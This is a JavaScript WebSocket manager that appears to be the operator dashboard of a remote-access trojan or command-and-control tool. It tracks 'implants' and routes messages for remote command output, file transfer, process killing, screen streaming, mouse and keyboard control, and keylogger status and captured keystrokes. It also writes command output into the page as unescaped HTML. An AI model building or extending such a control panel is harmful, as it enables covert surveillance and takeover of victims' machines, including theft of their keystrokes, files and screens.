// WebSocket Manager Module
const WebSocketManager = {
    socket: null,
    messageHandlers: new Map(),
    connectionPromise: null,
    connectionRetries: 0,
    maxRetries: 5,
    retryInterval: 2000,
    isConnecting: false,
    reconnectTimeout: null,
    lastConnectionAttempt: 0,
    connectionCooldown: 5000, // Increased cooldown to 5 seconds
    selectedImplantId: null,
    pendingMessages: [],
    connectionState: 'disconnected',
    reconnectInProgress: false,
    forceReconnect: false,

    // Send a pong response to the server to keep the connection alive
    sendPong() {
        this.send({
            type: 'pong',
            timestamp: new Date().toISOString()
        });
    },
    
    // Update the connection latency display based on heartbeats
    updateConnectionLatency() {
        if (this.lastHeartbeatTime) {
            const latencyEl = document.getElementById('connection-latency');
            if (latencyEl) {
                const elapsedTime = Date.now() - this.lastHeartbeatTime;
                latencyEl.textContent = elapsedTime < 60000 ? 
                    `${Math.round(elapsedTime / 1000)}s ago` : 
                    'Unknown';
            }
            
            // Update connection time 
            const connectionTimeEl = document.getElementById('connection-time');
            if (connectionTimeEl && this.connectionStartTime) {
                const connectedDuration = Math.floor((Date.now() - this.connectionStartTime) / 1000);
                const minutes = Math.floor(connectedDuration / 60);
                const seconds = connectedDuration % 60;
                connectionTimeEl.textContent = `${minutes}m ${seconds}s`;
            }
        }
    },
    
    init() {
        // Check if we're already connecting - prevent multiple simultaneous connection attempts
        if (this.isConnecting && !this.forceReconnect) {
            console.log('Connection already in progress, skipping redundant init');
            return;
        }
        
        // Initialize timing variables for connection health monitoring
        this.lastHeartbeatTime = null;
        this.connectionStartTime = null;
        
        // Reset force reconnect flag if it was set
        this.forceReconnect = false;
        
        // Enforce connection cooldown period to prevent rapid connect/disconnect cycles
        const now = Date.now();
        if (now - this.lastConnectionAttempt < this.connectionCooldown && !this.forceReconnect) {
            console.log(`Connection attempt too soon, enforcing cooldown (${this.connectionCooldown}ms)`);
            
            // Clear any existing reconnect timeout
            if (this.reconnectTimeout) {
                clearTimeout(this.reconnectTimeout);
            }
            
            // Set a timeout to try again after the cooldown
            this.reconnectTimeout = setTimeout(() => {
                console.log('Cooldown expired, attempting connection');
                this.init();
            }, this.connectionCooldown);
            
            return;
        }
        
        // Update connection timestamp
        this.lastConnectionAttempt = now;
        this.isConnecting = true;
        
        // Verify token first
        const token = localStorage.getItem('token');
        if (!token) {
            console.error('No authentication token found');
            window.location.href = '/login';
            this.isConnecting = false;
            return;
        }
        
        // Try to restore selected implant from storage
        if (!this.selectedImplantId) {
            this.selectedImplantId = localStorage.getItem('selectedImplantId');
        }
        console.log(`Initializing WebSocket with token and implant ID: ${this.selectedImplantId}`);
        
        // Update UI with connecting status
        this.updateConnectionStatus('connecting');
        
        // Verify token with API before attempting WebSocket
        fetch('/api/clients', {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        }).then(response => {
            if (!response.ok) {
                console.error('Token validation failed, redirecting to login');
                localStorage.removeItem('token');
                window.location.href = '/login';
                this.isConnecting = false;
                return;
            }
            
            // Token is valid, initialize WebSocket
            this.initWebSocket(token);
        }).catch(error => {
            console.error('API validation error:', error);
            this.updateConnectionStatus('error', 'API validation failed');
            this.connectionRetries++;
            this.isConnecting = false;
            
            if (this.connectionRetries < this.maxRetries) {
                // Set a timeout to try again after the retry interval
                if (this.reconnectTimeout) {
                    clearTimeout(this.reconnectTimeout);
                }
                
                this.reconnectTimeout = setTimeout(() => {
                    console.log(`Retry attempt ${this.connectionRetries} after API validation error`);
                    this.init();
                }, this.retryInterval * Math.min(this.connectionRetries, 3)); // Gradually increase timeout
            } else {
                this.handleMaxRetriesReached();
            }
        });
    },

    initWebSocket(token) {
        try {
            // HTTPS pages must use secure WebSockets (wss://)
            let protocol;
            if (window.location.protocol === 'https:') {
                protocol = 'wss:';
            } else {
                // For HTTP, allow protocol override from localStorage
                const protocolOverride = localStorage.getItem('ws_protocol_override');
                protocol = protocolOverride || 'ws:';
            }
            
            // Always upgrade to secure WebSocket for HTTPS pages, ignore override
            if (window.location.protocol === 'https:') {
                protocol = 'wss:';
            }
            
            // For development with self-signed certificates, we need to handle the case
            // where we're using HTTPS but the WebSocket endpoint doesn't have a valid cert
            const forceInsecureWs = localStorage.getItem('force_insecure_ws');
            
            // Use the final protocol (with security checks)
            const wsUrl = `${protocol}//${window.location.host}/ws/dashboard?token=${token}`;
            
            console.log(`Connecting to WebSocket using ${protocol} protocol`); 
            
            console.log(`Connecting to WebSocket at ${wsUrl.substring(0, wsUrl.indexOf('?'))}...`);
            this.updateConnectionStatus('connecting');
            
            // If there's an existing socket, close it properly
            this.safelyCloseSocket();
            
            // Create new socket with proper error handling
            this.socket = new WebSocket(wsUrl);
            
            this.socket.onopen = () => {
                console.log('WebSocket connection established');
                this.isConnecting = false;
                this.connectionRetries = 0;
                this.reconnectInProgress = false;
                this.updateConnectionStatus('connected');
                
                // Record connection start time for monitoring
                this.connectionStartTime = Date.now();
                this.lastHeartbeatTime = Date.now(); // Initialize with current time
                
                // Update UI with connection time
                const connectionTimeEl = document.getElementById('connection-time');
                if (connectionTimeEl) {
                    connectionTimeEl.textContent = "Just now";
                }
                
                // Start a timer to check connection health every 30 seconds
                if (this._connectionHealthInterval) {
                    clearInterval(this._connectionHealthInterval);
                }
                this._connectionHealthInterval = setInterval(() => {
                    this.checkConnectionHealth();
                }, 30000);
                
                // Initialize all modules with this socket
                this.initializeModules();
                
                // Request initial implants list
                this.send({
                    type: 'get_implants'
                });
                
                // Send any pending messages
                this.processPendingMessages();
                
                // Dispatch a custom event that the websocket is ready
                document.dispatchEvent(new CustomEvent('websocket-ready', { detail: this.socket }));
            };
            
            this.socket.onmessage = (event) => {
                try {
                    const message = JSON.parse(event.data);
                    this.handleMessage(message);
                    
                    // Also dispatch a custom event so modules can listen for specific message types
                    document.dispatchEvent(new CustomEvent('socket-message', { detail: message }));
                } catch (error) {
                    console.error('Error parsing WebSocket message:', error);
                }
            };
            
            this.socket.onclose = (event) => {
                console.log(`WebSocket connection closed: ${event.code} - ${event.reason}`);
                this.isConnecting = false;
                
                // First, update connection status and notify UI
                this.updateConnectionStatus('disconnected', `Code: ${event.code}`);
                
                // Safely dispatch disconnection event - this prevents the TypeError
                try {
                    // Safely notify modules of disconnection through custom event
                    const disconnectEvent = new CustomEvent('websocket-disconnected', {
                        detail: {
                            code: event.code,
                            reason: event.reason
                        }
                    });
                    
                    // Only dispatch if document exists and is not null
                    if (document) {
                        document.dispatchEvent(disconnectEvent);
                    }
                } catch (e) {
                    console.error('Error dispatching websocket-disconnected event:', e);
                }
                
                // Stop any active streaming in RemoteControlModule
                try {
                    if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule) {
                        if (RemoteControlModule.isStreaming) {
                            console.log('Stopping screen stream due to WebSocket disconnection');
                            // Use stopScreenStream instead of stopScreenCapture
                            if (typeof RemoteControlModule.stopScreenStream === 'function') {
                                RemoteControlModule.stopScreenStream();
                            }
                        }
                        if (RemoteControlModule.isControlActive) {
                            console.log('Disabling remote control due to WebSocket disconnection');
                            if (typeof RemoteControlModule.disableRemoteControl === 'function') {
                                RemoteControlModule.disableRemoteControl();
                            }
                        }
                    }
                } catch (e) {
                    console.error('Error stopping streaming on disconnect:', e);
                }
                
                // Clear connection health check interval
                if (this._connectionHealthInterval) {
                    clearInterval(this._connectionHealthInterval);
                    this._connectionHealthInterval = null;
                }
                
                // Reset connection timing variables
                this.connectionStartTime = null;
                this.lastHeartbeatTime = null;
                
                // Prevent reconnection storm by checking if we're in the middle of reconnecting
                if (this.reconnectInProgress) {
                    console.log('Reconnection already in progress, ignoring close event');
                    return;
                }
                
                // Don't retry immediately if this was a normal closure
                if (event.code === 1000 || event.code === 1001) {
                    console.log('Normal closure, waiting longer before reconnecting');
                    setTimeout(() => {
                        this.connectionRetries++;
                        if (this.connectionRetries < this.maxRetries) {
                            this.reconnectInProgress = true;
                            this.init();
                        } else {
                            this.handleMaxRetriesReached();
                        }
                    }, 5000); // Wait 5 seconds for normal closures
                } else {
                    // Attempt to reconnect for other closure reasons
                    this.connectionRetries++;
                    if (this.connectionRetries < this.maxRetries) {
                        console.log(`Reconnecting... (attempt ${this.connectionRetries})`);
                        const delay = Math.min(30000, this.retryInterval * this.connectionRetries); // Exponential backoff up to 30 seconds
                        this.updateConnectionStatus('reconnecting', `Attempt ${this.connectionRetries}/${this.maxRetries}`);
                        this.reconnectInProgress = true;
                        setTimeout(() => this.init(), delay);
                    } else {
                        this.handleMaxRetriesReached();
                    }
                }
            };
            
            this.socket.onerror = (error) => {
                console.error('WebSocket error:', error);
                this.updateConnectionStatus('error', 'Connection error');
            };
        } catch (error) {
            console.error('Error initializing WebSocket:', error);
            this.updateConnectionStatus('error', 'Failed to initialize');
            this.isConnecting = false;
            
            // Try to reconnect
            this.connectionRetries++;
            if (this.connectionRetries < this.maxRetries) {
                setTimeout(() => this.init(), this.retryInterval);
            } else {
                this.handleMaxRetriesReached();
            }
        }
    },
    
    safelyCloseSocket() {
        if (this.socket) {
            console.log('Closing existing socket before creating new one');
            try {
                // Remove all existing event listeners to prevent multiple handlers
                this.socket.onopen = null;
                this.socket.onmessage = null;
                this.socket.onclose = null;
                this.socket.onerror = null;
                
                // Only close if not already closed or closing
                if (this.socket.readyState < WebSocket.CLOSING) {
                    this.socket.close(1000, "Intentional closure");
                }
            } catch (e) {
                console.warn('Error closing existing socket:', e);
            }
            this.socket = null;
        }
    },

    updateConnectionStatus(status, details = '') {
        console.log(`Connection status: ${status} ${details}`);
        
        // Only update if status has actually changed
        if (this.connectionState === status) {
            console.log(`Status unchanged (${status}), skipping redundant update`);
            return;
        }
        
        // Update internal state
        this.connectionState = status;
        
        // Update connection indicator UI elements 
        const connectionText = document.getElementById('connection-text');
        const connectionLatency = document.getElementById('connection-latency');
        const indicator = document.querySelector('.connection-indicator');
        
        if (connectionText) {
            switch (status) {
                case 'connected':
                    connectionText.textContent = 'Connected';
                    connectionText.className = 'text-success';
                    break;
                case 'connecting':
                    connectionText.textContent = 'Connecting...';
                    connectionText.className = 'text-warning';
                    break;
                case 'disconnected':
                    connectionText.textContent = 'Disconnected';
                    connectionText.className = 'text-danger';
                    break;
                case 'reconnecting':
                    connectionText.textContent = `Reconnecting... ${details}`;
                    connectionText.className = 'text-warning';
                    break;
                case 'error':
                    connectionText.textContent = `Error: ${details}`;
                    connectionText.className = 'text-danger';
                    break;
                default:
                    connectionText.textContent = status;
            }
        }
        
        if (indicator) {
            indicator.className = 'connection-indicator';
            if (status === 'connected') {
                indicator.classList.add('connected');
            } else if (status === 'connecting' || status === 'reconnecting') {
                indicator.classList.add('connecting');
            } else {
                indicator.classList.add('disconnected');
            }
        }
        
        // Get existing notification elements
        const notificationContainer = document.getElementById('alerts-container');
        const existingNotifications = notificationContainer ? 
            notificationContainer.querySelectorAll('.alert[data-notification-type="connection"]') : [];
        
        // Show notification for important status changes, but avoid spam
        if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
            // Clear existing connection notifications first
            existingNotifications.forEach(notification => {
                notification.remove();
            });
            
            // Only show notifications for major state changes
            if (status === 'connected') {
                dashboard.showNotification('WebSocket connected successfully', 'success', 'connection');
            } else if (status === 'error') {
                dashboard.showNotification(`WebSocket error: ${details}`, 'danger', 'connection');
            } else if (status === 'disconnected') {
                dashboard.showNotification('WebSocket disconnected', 'warning', 'connection');
            } else if (status === 'reconnecting' && this.connectionRetries === 1) {
                // Only show first reconnect attempt
                dashboard.showNotification(`Reconnecting... (Attempt ${this.connectionRetries}/${this.maxRetries})`, 'info', 'connection');
            }
        }
    },
    
    handleMaxRetriesReached() {
        console.error('Maximum reconnection attempts reached');
        this.updateConnectionStatus('error', 'Max reconnection attempts reached');
        
        // Show a dialog to the user
        if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
            dashboard.showNotification('Unable to connect to the server after multiple attempts. Please refresh the page or check your connection.', 'danger');
        }
        
        // Create refresh button in the connection status area
        const connectionStatus = document.getElementById('connection-status');
        if (connectionStatus) {
            const refreshBtn = document.createElement('button');
            refreshBtn.className = 'btn btn-primary mt-2';
            refreshBtn.innerHTML = '<i class="fas fa-sync"></i> Refresh Connection';
            refreshBtn.onclick = () => {
                this.connectionRetries = 0;
                this.init();
            };
            
            // Remove any existing refresh button first
            const existingBtn = connectionStatus.querySelector('.btn-primary');
            if (existingBtn) {
                existingBtn.remove();
            }
            
            connectionStatus.appendChild(refreshBtn);
        }
    },
    
    processPendingMessages() {
        if (this.pendingMessages.length > 0) {
            console.log(`Processing ${this.pendingMessages.length} pending messages`);
            
            const messages = [...this.pendingMessages];
            this.pendingMessages = [];
            
            messages.forEach(msg => {
                this.send(msg);
            });
        }
    },

    initializeModules() {
        // Initialize all dependent modules that need the WebSocket
        // First, check if they exist in the global scope
        console.log('Initializing dependent modules with WebSocket');
        
        // Initialize RemoteControlModule if it exists
        if (typeof RemoteControlModule !== 'undefined') {
            console.log('Initializing RemoteControlModule with WebSocket');
            try {
                if (typeof RemoteControlModule.init === 'function') {
                    RemoteControlModule.init(this.socket);
                    console.log('RemoteControlModule initialization successful');
                } else {
                    console.error('RemoteControlModule.init is not a function');
                }
            } catch (error) {
                console.error('Error initializing RemoteControlModule:', error);
            }
        } else {
            console.log('RemoteControlModule not found, skipping initialization');
        }
        
        // Dispatch an event that modules have been initialized
        document.dispatchEvent(new CustomEvent('modules-initialized'));
        
        // Enable emergency mode automatically if we had to retry connections
        if (this.connectionRetries > 0 && typeof RemoteControlModule !== 'undefined') {
            console.log(`Auto-enabling emergency mode after ${this.connectionRetries} connection attempts`);
            try {
                if (typeof RemoteControlModule.enableEmergencyMode === 'function') {
                    // Use silent mode to avoid notification spam
                    RemoteControlModule.enableEmergencyMode(true);
                }
            } catch (error) {
                console.error('Error enabling emergency mode:', error);
            }
        }
    },

    handleMessage(message) {
        console.log('Received message:', message.type, message);
        
        switch (message.type) {
            case 'heartbeat':
                // Handle server heartbeat - respond with a pong to keep connection alive
                console.log('Received heartbeat from server, sending pong');
                this.sendPong();
                
                // Update last ping time to track connection health
                this.lastHeartbeatTime = Date.now();
                
                // Update connection indicator
                this.updateConnectionLatency();
                break;
                
            case 'implants':
                if (typeof ImplantsModule !== 'undefined' && ImplantsModule.handleImplants) {
                    ImplantsModule.handleImplants(message);
                }
                break;
                
            case 'alert':
                if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
                    dashboard.showNotification(message.message, message.alert_type);
                }
                break;
                
            case 'command_output':
                // Command output
                if (typeof dashboard !== 'undefined' && dashboard.updateCommandOutput) {
                    dashboard.updateCommandOutput(message.output);
                }
                break;
                
            case 'file_list':
                // File listing
                if (typeof FileManager !== 'undefined' && FileManager.handleFileList) {
                    FileManager.handleFileList(message);
                }
                break;
                
            case 'file_download':
                // File download
                if (typeof FileManager !== 'undefined' && FileManager.handleFileDownload) {
                    FileManager.handleFileDownload(message);
                }
                break;
                
            case 'file_upload_complete':
                // File upload completion
                if (typeof FileManager !== 'undefined' && FileManager.handleFileUploadComplete) {
                    FileManager.handleFileUploadComplete(message);
                }
                break;
                
            case 'process_list':
                // Process list
                if (typeof ProcessManager !== 'undefined' && ProcessManager.handleProcessList) {
                    ProcessManager.handleProcessList(message);
                }
                break;
                
            case 'process_info':
                // Process details
                if (typeof ProcessManager !== 'undefined' && ProcessManager.showProcessDetailsModal) {
                    ProcessManager.showProcessDetailsModal(message.process_info);
                }
                break;
                
            case 'process_killed':
                // Process kill result
                if (typeof ProcessManager !== 'undefined' && ProcessManager.handleProcessKilled) {
                    ProcessManager.handleProcessKilled(message);
                }
                break;
                
            case 'screen_capture':
            case 'screenshot':
                // Screen capture
                if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.handleScreenCapture) {
                    RemoteControlModule.handleScreenCapture(message);
                }
                break;
                
            case 'system_info':
                // System info should update both the system metrics and full system info
                console.log('Received system_info message:', message);
                
                if (typeof RemoteControlModule !== 'undefined') {
                    // First try the handleSystemInfo method for full info display
                    if (RemoteControlModule.handleSystemInfo) {
                        console.log('Calling RemoteControlModule.handleSystemInfo');
                        RemoteControlModule.handleSystemInfo(message);
                    }
                    
                    // Also try updateSystemMetrics for backward compatibility
                    if (RemoteControlModule.updateSystemMetrics && message.data) {
                        console.log('Calling RemoteControlModule.updateSystemMetrics');
                        RemoteControlModule.updateSystemMetrics(message.data);
                    }
                    
                    // Update connection status
                    const connectionText = document.getElementById('connection-text');
                    if (connectionText) {
                        connectionText.textContent = 'Connected';
                        connectionText.className = 'text-success';
                    }
                    
                    // Update the connection indicator
                    const indicator = document.querySelector('.connection-indicator');
                    if (indicator) {
                        indicator.classList.add('connected');
                    }
                }
                break;
                
            case 'control_status':
                // Remote control status update
                if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.handleControlStatus) {
                    RemoteControlModule.handleControlStatus(message);
                }
                break;
                
            case 'keylogger_status':
                // Keylogger status update
                if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.handleKeyloggerStatus) {
                    RemoteControlModule.handleKeyloggerStatus(message.data);
                }
                break;
                
            case 'keylogger_data':
                // Keylogger data
                if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.handleKeyloggerData) {
                    RemoteControlModule.handleKeyloggerData(message.data);
                }
                break;
                
            case 'mouse_action_result':
                // Mouse action result
                if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.handleMouseActionResult) {
                    RemoteControlModule.handleMouseActionResult(message);
                }
                break;
                
            case 'keyboard_action_result':
                // Keyboard action result
                if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.handleKeyboardActionResult) {
                    RemoteControlModule.handleKeyboardActionResult(message);
                }
                break;
                
            default:
                console.warn('Unknown message type:', message.type);
        }
    },

    send(data) {
        // First check if socket exists and is in OPEN state (readyState === 1)
        const isSocketReady = this.socket && this.socket.readyState === WebSocket.OPEN;
        
        if (!isSocketReady) {
            console.log('WebSocket not connected, queueing message for later');
            
            // Store message for later sending
            this.pendingMessages.push(data);
            
            // Update connection status if we're not already reconnecting
            if (this.connectionState !== 'reconnecting') {
                this.updateConnectionStatus('reconnecting');
            }
            
            // Only trigger reconnect if socket is really closed (not connecting or closing)
            if (!this.socket || this.socket.readyState === WebSocket.CLOSED) {
                // And only if we're not already trying to reconnect
                if (!this.isConnecting && !this.reconnectInProgress) {
                    console.log('Socket closed, attempting to reconnect');
                    // Use reconnect instead of init to properly handle the retries
                    this.reconnect();
                } else {
                    console.log('Reconnection already in progress, not starting another');
                }
            } else if (this.socket && this.socket.readyState === WebSocket.CONNECTING) {
                console.log('Socket is in connecting state, waiting for connection');
            } else if (this.socket && this.socket.readyState === WebSocket.CLOSING) {
                console.log('Socket is in closing state, will reconnect when fully closed');
            }
            
            return { queued: true, success: false };
        }
        
        try {
            this.socket.send(JSON.stringify(data));
            return { queued: false, success: true };
        } catch (error) {
            console.error('Error sending WebSocket message:', error);
            
            // Store message for later sending
            this.pendingMessages.push(data);
            
            return { queued: true, success: false, error };
        }
    },

    // Check if the connection is still healthy based on heartbeats
    checkConnectionHealth() {
        if (!this.lastHeartbeatTime) return;
        
        const now = Date.now();
        const timeSinceLastHeartbeat = now - this.lastHeartbeatTime;
        
        // If no heartbeat for more than 60 seconds, connection may be dead
        if (timeSinceLastHeartbeat > 60000 && this.socket && this.socket.readyState === WebSocket.OPEN) {
            console.warn(`No heartbeat received for ${Math.round(timeSinceLastHeartbeat/1000)}s, checking connection...`);
            
            // Send a ping to check if connection is still alive
            try {
                this.send({
                    type: 'ping',
                    timestamp: new Date().toISOString()
                });
                
                // If we don't get a response within 10 seconds, force reconnect
                setTimeout(() => {
                    const newTimeSinceHeartbeat = Date.now() - this.lastHeartbeatTime;
                    if (newTimeSinceHeartbeat > 60000) {
                        console.error(`Connection appears dead (${Math.round(newTimeSinceHeartbeat/1000)}s since last heartbeat). Force reconnecting...`);
                        this.reconnect();
                    }
                }, 10000);
            } catch (e) {
                console.error('Error sending ping, connection likely dead:', e);
                this.reconnect();
            }
        }
        
        // Update UI with connection time
        this.updateConnectionLatency();
    },
    
    close() {
        // Clear any connection health check interval
        if (this._connectionHealthInterval) {
            clearInterval(this._connectionHealthInterval);
            this._connectionHealthInterval = null;
        }
        
        if (this.socket) {
            this.socket.close();
            this.socket = null;
        }
    },

    setSelectedImplant(implantId) {
        console.log(`WebSocketManager: Setting selected implant to ${implantId}`);
        this.selectedImplantId = implantId;
        localStorage.setItem('selectedImplantId', implantId);
        
        // Notify all modules about the implant selection
        if (typeof ImplantsModule !== 'undefined' && ImplantsModule.selectImplant) {
            ImplantsModule.selectImplant(implantId);
        }
        
        if (typeof RemoteControlModule !== 'undefined' && RemoteControlModule.selectImplant) {
            RemoteControlModule.selectImplant(implantId);
        }
        
        // Dispatch a custom event that other modules can listen for
        document.dispatchEvent(new CustomEvent('implant-selected', { 
            detail: { implantId: implantId } 
        }));
        
        return implantId;
    },
    
    getSelectedImplant() {
        return this.selectedImplantId;
    },

    reconnect() {
        console.log('Manual reconnection requested');
        
        // Reset connection retry counter
        this.connectionRetries = 0;
        this.forceReconnect = true;
        this.reconnectInProgress = false;
        
        // Update status
        this.updateConnectionStatus('connecting', 'Manual reconnection');
        
        // Show notification
        if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
            dashboard.showNotification('Attempting to reconnect...', 'info');
        }
        
        // Close existing socket if any
        this.safelyCloseSocket();
        
        // Reinitialize connection
        this.init();
        
        return true;
    },

    // Add a server status check method that uses HTTP fallback
    checkServerStatus() {
        console.log('Checking server status...');
        
        // Show a notification that we're checking
        if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
            dashboard.showNotification('Checking server status...', 'info', 'server-check');
        }
        
        // Get the token
        const token = localStorage.getItem('token');
        if (!token) {
            console.error('No authentication token found');
            if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
                dashboard.showNotification('Authentication required', 'error', 'server-check');
            }
            return;
        }
        
        // Make a simple API request to check server connectivity
        fetch('/api/diagnostics/websocket', {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Server diagnostic results:', data);
            
            // If the server reported an error, handle it
            if (data.status === 'error') {
                throw new Error(data.error_message || 'Unknown server error');
            }
            
            // Show the results in a toast
            if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
                let message = `
                    <strong>Server Status:</strong> ${data.status}<br>
                    <strong>Dashboard Connections:</strong> ${data.dashboard_connections}<br>
                    <strong>Client Connections:</strong> ${data.client_connections}<br>
                    <strong>Server Uptime:</strong> ${Math.floor(data.server_uptime / 60)} min<br>
                    <strong>WS Connectivity:</strong> ${this.connectionState}
                `;
                
                dashboard.showNotification(message, 'success', 'server-check');
            }
            
            // If we can reach the server but WebSocket is disconnected, suggest a fix
            if (this.connectionState !== 'connected') {
                console.log('Server is reachable but WebSocket is disconnected. Suggesting repair options...');
                
                // Check if we need to try WebSockets with different protocol (ws vs wss)
                const currentProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const alternativeProtocol = currentProtocol === 'wss:' ? 'ws:' : 'wss:';
                
                if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
                    dashboard.showNotification(`
                        Server is online but WebSocket connection failed.<br>
                        1. Try <a href="#" onclick="RemoteControlModule.enableEmergencyMode(); return false;">Emergency Mode</a><br>
                        2. Or <a href="#" onclick="WebSocketManager.forceProtocol('${alternativeProtocol}'); return false;">try ${alternativeProtocol}</a>
                    `, 'warning', 'repair');
                }
            }
        })
        .catch(error => {
            console.error('Server check failed:', error);
            
            if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
                dashboard.showNotification(`
                    Server check error: ${error.message}.<br>
                    <a href="#" onclick="RemoteControlModule.enableEmergencyMode(); return false;">Enable Emergency Mode</a> to use HTTP fallback.
                `, 'danger', 'server-check');
            }
        });
    },

    // Force a specific WebSocket protocol (ws: or wss:)
    forceProtocol(protocol) {
        console.log(`Forcing WebSocket protocol to ${protocol}`);
        
        if (typeof dashboard !== 'undefined' && dashboard.showNotification) {
            dashboard.showNotification(`Trying WebSocket with ${protocol} protocol...`, 'info');
        }
        
        // Store the protocol preference
        localStorage.setItem('ws_protocol_override', protocol);
        
        // Reset connection retry counter
        this.connectionRetries = 0;
        
        // Close existing socket if any
        if (this.socket) {
            try {
                this.socket.close();
            } catch (e) {
                console.warn('Error closing socket when changing protocol:', e);
            }
            this.socket = null;
        }
        
        // Restart connection
        this.init();
    }
};

// Initialize when document is ready
document.addEventListener('DOMContentLoaded', () => {
    WebSocketManager.init();
});

// Add global dashboard object for common utilities
const dashboard = {
    formatBytes(bytes, decimals = 2) {
        if (bytes === 0) return '0 Bytes';
        
        const k = 1024;
        const dm = decimals < 0 ? 0 : decimals;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
        
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        
        return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
    },
    
    formatDate(timestamp) {
        return new Date(timestamp * 1000).toLocaleString();
    },
    
    showNotification(message, type = 'info', notificationType = '') {
        const alertsContainer = document.getElementById('alerts-container');
        if (!alertsContainer) return;
        
        // Limit to 5 notifications at once to prevent UI overload
        const existingAlerts = alertsContainer.querySelectorAll('.alert');
        if (existingAlerts.length >= 5) {
            // Remove oldest notification (the first one)
            const oldestAlert = existingAlerts[0];
            oldestAlert.remove();
        }
        
        const alert = document.createElement('div');
        alert.className = `alert alert-${type} alert-dismissible fade show`;
        if (notificationType) {
            alert.setAttribute('data-notification-type', notificationType);
        }
        
        alert.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;
        
        alertsContainer.appendChild(alert);
        
        // Remove after 4 seconds
        setTimeout(() => {
            alert.classList.remove('show');
            setTimeout(() => alert.remove(), 300);
        }, 4000);
    },
    
    updateCommandOutput(output) {
        const consoleOutput = document.getElementById('console-output');
        if (consoleOutput) {
            consoleOutput.innerHTML += `<pre>${output}</pre>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }
    }
}; 